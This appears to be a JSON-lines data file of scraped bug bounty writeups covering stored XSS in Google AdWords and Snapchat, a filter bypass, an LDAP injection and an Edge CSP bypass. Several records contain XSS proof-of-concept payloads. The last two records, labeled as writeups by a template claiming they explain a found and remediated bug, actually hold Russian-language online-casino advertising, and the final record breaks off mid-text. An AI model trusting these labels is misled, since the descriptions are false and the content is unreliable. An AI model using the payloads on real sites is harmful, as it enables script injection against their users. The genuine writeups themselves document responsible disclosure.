{"source_url": "https://medium.com/@Alra3ees/google-adwords-3133-7-stored-xss-27bb083b8d27", "title": "Google adwords 3133.7$ Stored XSS | by Emad Shanab | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@Alra3ees/google-adwords-3133-7-stored-xss-27bb083b8d27. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGoogle adwords 3133.7$ Stored XSS | by Emad Shanab | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Google adwords 3133.7$ Stored XSS Emad Shanab 4 min read · Mar 21, 2018 -- 19 Listen Share welcome my brothers and friends. I would love to thank you for your support and wish success to all. There was a dream called Google and its HOF without thinking about reward or anything else. This vulnerability was the easiest vulnerability and more vulnerability has been rewarded so far. In 17/02/2018 I posted a post on Facebook. I think it’s the time to get Google HOF Because I always choose my target and do not go to another without ending it completely. My work as a lawyer also takes all my time and I only have 6 hours daily to do my hobby. On 08/03/2018 while browsing my gmail I clicked on even more from Google . You will find it in the up right side. Even more from Google Press enter or click to view image in full size Google products page After browsing the entire page I chose my target which is Google adwords. I logged in and started the test and moved from page to another and in fact I was playing didn't expect to find anything. I was added many payloads hoping that the magic alert would appear. I went to this page:- https://adwords.google.com/aw/conversions Press enter or click to view image in full size conversions I added a new conversation and in the conversation name i put this payload. “><svg/onload=alert(document.domain)>” @x .y Press enter or click to view image in full size conversation name After added the payload it pupped up many times and I thought it might be a self XSS so i clicked on prevent this message to continue and complete it. After completion i have clicked on Save Conversation. And the payload didn't pupped up any more because i chooses to prevent the XSS alert. I copied the entire URL and paste it into the browser in a new tab and this time I got shocked. The payload was stored on the page and works on all the latest versions of browsers. Press enter or click to view image in full size XSS pupped up in latest version of Firefox for Kali Linux And worked on Firefox in windows. Press enter or click to view image in full size XSS pupped up in latest version of Firefox for windows I made a cup of coffee and lit a cigarette and wrote the report and I made a video to explain the vulnerability and report it to Google and waited for the reply hoping not to be duplicated. I received a message from Google accepting the vulnerability and nice catch ( i loved it ). Press enter or click to view image in full size nice catch ( i loved it ) A very easy vulnerability and I got A good bounty from Google Vulnerability Reward Program and HOF. Press enter or click to view image in full size Rewarded $ 3133.7 Finally my name added to Google HOF. Press enter or click to view image in full size Google HOF Time line:- 08/03/2018 I have found the vulnerability and Email sent to Google 08/03/2018 Got automatically replay confirms they’ve received my message 08/03/2018 I received a message from Google accepting the vulnerability 08/03/2018 I received a message from Google nice catch ( i loved it ) 20/03/2018 closed the report and changed the status to Resolved 20/03/2018 Rewarded $ 3133.7 for Stored XSS in google adwords I would love to thank you all for your patience in reading my write up and for your continued support. specially :- @ak1t4 z3n @Brute and @IfrahIman_ I'm very happy to unlock this achievement and my goal for this year is perfect so far. sorry for my bad English but just i wanted to share this with yo u as always i doing. The POC video hope you will like it:- Security XSS Knoxss Emad Shanab Cross Site Scripting Google Bug bounty Security -- -- 19 Written by Emad Shanab 1.8K followers · 172 following A lawyer & A noooob & every law has it’s own bugs 🐜 Responses ( 19 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@prial261/story-of-a-stored-xss-bypass-26e6659f807b", "title": "Story Of a Stored XSS Bypass. Hi readers , | by Prial Islam Khan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@prial261/story-of-a-stored-xss-bypass-26e6659f807b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStory Of a Stored XSS Bypass. Hi readers , | by Prial Islam Khan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Story Of a Stored XSS Bypass Prial Islam Khan 2 min read · Apr 21, 2018 -- 4 Listen Share Hi readers , I am a Cyber Security Researcher from Bangladesh . This is my 1st write-up and also I am not good at XSS so forgive all mistakes . Recently I was testing a private site and in that site users can add their personal information . I noticed a Input there named Secret Key which allows user to process payments and store transaction information to an application. So I input a Normal payload :- “><img src=x onerror=prompt(document.domain)> and it got filtered and the page source was like :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\">&lt;img img\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> So from the source I understand that :- 1. quot (“) and greater-than (>) signs are not being filtered properly . 2. Malicious tags are being filtered . For that <img> become img img So I have 2 possible way to execute JavaScript . 1st one is somehow bypass the less than (<) filter and the 2nd one is adding a malicious HTML Attributes to execute JavaScript . I tried many way to bypass the less than(<) Character but was unable to do . So I processed with 2nd way by adding a Malicious HTML Attributes . So I entered below payload :- “ OnMouseOver=prompt(1) Response was :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\" OnMouseOver=prompt&#40;\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> So I was able to add a HTML Attributes but Brackets are being filtered properly . So I entered below payload :- “ OnMouseOver=prompt`1` Response was :- <input type=\"text\" id=\"****\" name=\"****\" value=\"\" OnMouseOver=prompt`1`\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> But code Not executed . Take a closer look and the payload just need a quot (“) 🤔🤔🤔 :- “ OnMouseOver=”prompt`1` Response was :- <input type=\"text\" id=\"ipn_secret_keygen\" name=\"ipn_secret_keygen\" value=\"\"OnMouseOver=\"alert`1`\" class=\"form-control\" rel=\"gp\" data-size=\"20\" data-character-set=\"a-z,A-Z,0-9\"> Looks good . Now I took my Mouse pointer on the Input and the OnMouseOver Event executed the XSS Popup 🤩🤩🤩 Press enter or click to view image in full size XSS Executed . Thanks for reading . Hope will get time to write some more posts . Find me on Facebook :- Prial Islam Khan Prial Islam Khan is on Facebook. Join Facebook to connect with Prial Islam Khan and others you may know. Facebook gives… facebook.com JavaScript Xss Bugbounty Xss Bypass -- -- 4 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Prial Islam Khan 1.1K followers · 258 following A teenager boy with passion of Breaking Security . Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd", "title": "Stored XSS on Snapchat. Hello Guyz, \nThis is @Mrityunjoy . A… | by Mrityunjoy | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Snapchat. Hello Guyz, This is @Mrityunjoy . A… | by Mrityunjoy | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Snapchat Mrityunjoy 2 min read · Feb 9, 2018 -- 2 Listen Share Hello Guyz, This is @Mrityunjoy . A Bug Bounty Hunter from Bangladesh. Today I want to share with you a Stored XSS which I found in Snapchat. While i testing i found a Snapchat Ads Domain. So i decided to test that domain to found some bugs. When i go to the ADS domain i noticed a Setup Option, That means first we need to create a ADS Account. I PUT a HTML TAG into the BUSINESS NAME field and fill up the other field as random words and started a account. Press enter or click to view image in full size I created a Organization and they have a invite member option, where i can invite new members on my Organization . Press enter or click to view image in full size I invited my own email to joining as Organization member. After Opening my mail i saw the BUSINESS NAME field was vulnerable to HTML INJECTION Press enter or click to view image in full size Press enter or click to view image in full size I was looking!!! Simply again i back to the Ads domain and tried to created another account. I PUT a simple payload test\"><img src=x onerror=prompt<domain)> into the BUSINESS NAME field and Started a account. Now again i created a Organization and invited my own email to joining as Organization member. Quickly i opened my mail and clicked the invitation link. After clicking the link bingo!!!! Got the XSS POPUP. I Managed to achieve the Stored XSS on all browsers. Press enter or click to view image in full size I was Feeling!!! Timeline Jul 13th — report submitted Jul 13th — Triaged Jul 17th — Rewarded Bounty Press enter or click to view image in full size Jul 17th — Resolved Thanks to Tarek Siddiki & Faisal Ahmed Security -- -- 2 Written by Mrityunjoy 204 followers · 3 following ~sup3r-b0y~ Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.nc-lp.com/blog/searching-for-xss-found-ldap-injection", "title": "Searching for XSS found LDAP injection | nc-lp.com", "friendly_explanation": "This is a bug bounty writeup from https://www.nc-lp.com/blog/searching-for-xss-found-ldap-injection. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSearching for XSS found LDAP injection | nc-lp.com nc-lp.com Blog Why this name? Contact Searching for XSS found LDAP injection 5th Jun 2018 vulnerability While searching for bugs on target website, I decided to check if it was vulnerable to blind XSS. It turns out that the system was vulnerable to LDAP injection. Context Some time ago I was assessing a website for vulnerabilities and I was reviewing all the possible endpoints. While surfing, I encountered a registration form to the service, it was pretty packed with fields and it seemed your account needed to be valuated and activated by a human. Usually registering to websites is a trivial test: if the website is built with a CMS, the workflow is pretty secure, otherwise there are chances to find some trivial SQL injections. However, this time I tried to exploit some side-channel vulnerabilities: if someone needs to review my data, maybe I can inject something into their backend and extract some data? Blind XSS That \"something\" is a blind XSS payload , where the payload is not executed directly on target website, but rather on another interface (for example admin backend). Detecting blind XSS is a little more complicated than regular onces, since you don't know when (and if) the payload would be executed. A great online tool is XSS hunter , that allows you to setup a test subdomain that will collect a lot of info once the vulnerability is triggered. So, I grabbed one of the default payloads, put into the fields and... bummer Built-in WAF and elusion Ok, it seems that there's some kind of protection in place. After some reading, it seems that's the default WAF for .NET applications. However, when there are default settings there are known workarounds, too. Searching on Internet, I found this article about some tags being allowed even if the WAF is turned on. Long story short, tag <%tag is allowed, which could cause isseus with IE9. Ok, it's quite old, but maybe it's my lucky day? I put the payload into the form and... wait what? LDAP injection Looking for the error code 0x80005000 and the error text An invalid directory pathname was passed I learnt that they are related to an LDAP error. This means that the server was taking user input with filtering it and trying to create a new user inside the LDAP server. Oh Boy! Exploiting LDAP injections is tricky, since they are ultra-blind and they aren't so common, I had to take back from the shelf my copy of The WebApplication Hacker's Handbook to refresh my memory. Luckly the error page was enough for a valid POC, so I reported it back. Conclusions If I had to sum up the whole experience in one phrase, I'd chose Expect the unexpected . Additionally, that's another reminder that you should never ever trust user input, even if there are protections in place. Related Posts Comments: Blog Comments powered by Disqus . Newer Post Older Post Home \" Davide Tampellini This is 10% luck 20% skill 15% concentrated power of will 5% pleasure 50% pain And a 100% reason to remember the name SimpleSearch Popular Tags web scraping full disclosure vulnerability passwords reverse engineer Archives 2 January 2019 1 December 2018 1 September 2018 1 August 2018 1 July 2018 1 June 2018 1 May 2018 1 April 2018 2 July 2017 1 April 2017 2 March 2017 1 February 2017"}
{"source_url": "https://medium.com/bugbountywriteup/bypass-csp-by-abusing-xss-filter-in-edge-43e9106a9754", "title": "Bypass CSP by Abusing XSS Filter in Edge | by Xiaoyin Liu | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/bypass-csp-by-abusing-xss-filter-in-edge-43e9106a9754. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass CSP by Abusing XSS Filter in Edge | by Xiaoyin Liu | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Bypass CSP by Abusing XSS Filter in Edge Xiaoyin Liu 3 min read · Apr 15, 2018 -- 1 Listen Share In this article, I will share a Content Security Policy (CSP) bypass vulnerability in Microsoft Edge, which I discovered in December 2016. The bypass was done by abusing the browser’s XSS filter. This is quite ironical, because both XSS filter and CSP are designed to protect users from XSS attacks, but this vulnerability allows attackers to abuse one XSS protection mechanism to bypass another. XSS filter was first introduced in IE 8. The purpose of a XSS filter is to mitigate reflective XSS attacks. The XSS filter of IE/Edge roughly works in this way: when the browser loads a URL, the XSS filter first checks if some parameters of the URL may contain XSS payloads, using a set of predefined regular expressions. For instance, http://example.com/index.php?id=100 is clearly harmless, but for a URL like http://example.com/index.php?id=<script>alert(1)</script> , the value of parameter id may be a XSS payload. Then, to determine whether it is a reflective XSS attack exactly, IE/Edge check if the returned HTML contains the substring <script>alert(1)</script> . If it does, IE/Edge assume it is reflected from the id parameter. Notice that this assumption may not be true: what if <script>alert(1)</script> is hardcoded in the page, and the id parameter actually doesn’t have any effect? There’re two modes for XSS filter: default mode and block mode. Sites can enable the block mode by setting HTTP header: X-XSS-Protection: 1; mode=block”. In the block mode, IE/Edge block the entire HTML from rendering. In the default mode, IE/Edge try to destroy XSS payloads by modifying the corresponding HTML tags. E.g. if Edge assumes <script>alert(1)</script> is a XSS, it changes this element to <sc#ipt>alert(1)</script> . Thus, the DOM parser won’t parse this segment as a <script> element, so it won’t execute. Now let’s see the vulnerability, CVE-2017–0135 . There are two ways for a website to set a Content Security Policy: via Content-Security-Policy HTTP response header field, or via <meta> tag. An example of such meta element is: <meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> . Now suppose here is the HTML for URL http://example.com/xss.html: <!DOCTYPE html> <html> <head> <title>CSP Test</title> <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\"> </head> <body> <script>alert(document.domain);</script> </body> </html> The CSP should block alert(document.domain) from executing. To bypass the CSP, let’s ask users to visit http://example.com/xss.html?<meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> (Just append meta element as a parameter to the URL.) Then, by default, Edge’s XSS filter simply modifies the meta tag to <me#a http-equiv=”Content-Security-Policy” content=”script-src ‘self’”> , which kills the CSP, and alert is executed. Press enter or click to view image in full size Figure 1 Screenshot of a successful CSP bypass This vulnerability was fixed in MS17-007 , released in March 2017. It was assigned CVE-2017-0135 . It’s fixed by blocking the whole HTML page, when the XSS filter detects the query string matches any meta element, regardless of modes. Although this vulnerability has been fixed, it’s still a good idea to set “X-XSS-Protection: 1; mode=block”. Also CSP policies delivered via HTTP headers are not vulnerable to this bypass attack. Timeline 12/2/2016: Vulnerability reported to MSRC 3/14/2017: Vulnerability fixed in MS17–007 (bug bounty: $1500) References Nava, E. V. and Lindsay, D., “ Abusing Internet Explorer 8’s XSS Filters ” W3C, “ Content Security Policy Level 2 ” IE 8 XSS Filter Architecture / Implementation Acknowledgements Many thanks to MSRC for fixing this bug and awarding me the bounty. This article was first published on Chinese website FreeBuf, link: http://www.freebuf.com/articles/web/164871.html (in Chinese). I want to thank them for allowing me to post the English version on Medium. Security Hacking Bug Bounty Information Security Xss Attack -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Xiaoyin Liu 226 followers · 5 following info security enthusiast https://twitter.com/general_nfs Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/04/reflected-xss-on-wwwzomatocom-by.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/04/reflected-xss-on-wwwzomatocom-by.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://www.mohamedharon.com/2018/03/xss-in-subdomain-httpsyefgrantsyahoocom.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/03/xss-in-subdomain-httpsyefgrantsyahoocom.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с 